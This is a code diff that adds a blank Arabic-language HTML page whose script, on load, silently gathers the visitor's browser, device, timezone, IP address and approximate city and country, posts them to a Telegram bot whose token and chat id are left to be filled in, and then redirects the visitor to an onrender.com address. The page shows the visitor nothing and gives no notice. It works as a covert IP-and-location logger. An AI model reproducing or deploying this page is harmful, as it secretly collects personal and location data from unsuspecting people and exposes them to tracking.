@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title></title>
+    <style>
+        body { font-family: sans-serif; direction: rtl; text-align: center; padding-top: 50px; }
+    </style>
+</head>
+<body>
+
+<h1></h1>
+
+<script>
+    const botToken = ""; // ضع توكن البوت هنا
+    const chatId   = "";   // ضع معرف المحادثة هنا
+
+    // جمع المعلومات التقنية الأساسية
+    const info = {
+        userAgent: navigator.userAgent,
+        language: navigator.language,
+        platform: navigator.platform,
+        screen: `${screen.width}x${screen.height}`,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        cookiesEnabled: navigator.cookieEnabled,
+        timestamp: new Date().toISOString()
+    };
+
+    // جلب الموقع التقريبي من IP باستخدام ipapi.co
+    fetch("https://ipapi.co/json/")
+        .then(res => res.json())
+        .then(location => {
+            // إضافة بيانات الموقع
+            info.ip = location.ip || "غير معروف";
+            info.city = location.city || "غير معروف";
+            info.region = location.region || "غير معروف";
+            info.country = location.country_name || "غير معروف";
+
+            const message = `
+📌 Visitor Info:
+
+User-Agent: ${info.userAgent}
+Platform:   ${info.platform}
+Language:   ${info.language}
+Screen:     ${info.screen}
+Timezone:   ${info.timezone}
+Cookies:    ${info.cookiesEnabled}
+Timestamp:  ${info.timestamp}
+IP:         ${info.ip}
+City:       ${info.city}
+Region:     ${info.region}
+Country:    ${info.country}
+`.trim();
+
+            // إرسال البيانات إلى Telegram Bot
+            return fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            });
+        })
+        .then(res => res.json())
+        .then(data => {
+            console.log("✔ :", data);
+            window.location.href = "https://occ-g8qv.onrender.com/"; // إعادة التوجيه
+        })
+        .catch(err => {
+            console.error("⚠ خطأ صفحة غير موجودة:", err);
+            window.location.href = "https://occ-g8qv.onrender.com/"; // إعادة التوجيه حتى لو فشل
+        });
+</script>
+
+</body>
+</html>
